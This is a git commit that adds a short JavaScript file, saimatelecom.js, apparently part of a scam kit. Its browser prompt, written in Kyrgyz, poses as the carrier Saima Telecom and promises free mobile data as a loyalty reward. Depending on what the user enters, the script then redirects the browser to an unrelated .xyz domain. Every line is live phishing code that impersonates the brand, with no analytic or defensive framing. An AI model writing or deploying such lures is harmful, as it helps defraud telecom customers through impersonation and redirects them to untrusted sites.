2a03d28d56b74fe17f3c8f16774ecc48f6629626
newetijazz1 <newetijazz1@gmail.com>
2025-08-30 09:47:59 +0100

    Create saimatelecom.js

---
+++ saimatelecom.js
@@ -0,0 +1,6 @@
+
+var password = '50 ГБ алыңыз'
+password=prompt('Saima Telecom: Урматтуу кардар, сиздин Saima telecom sim картаңыз 5ГБдан 100ГБга чейинки маалыматтарды алууга жарамдуу экенин текшериңиз, Эски Кардарлар Сыйлыгын, Азыр текшерүү үчүн Акысыз маалыматтарды басыңыз.','50 ГБ алыңыз');
+if (password != '50 ГБ алыңыз') {
+location.href='https://www.isadata.xyz/Saima-telecom';
+}
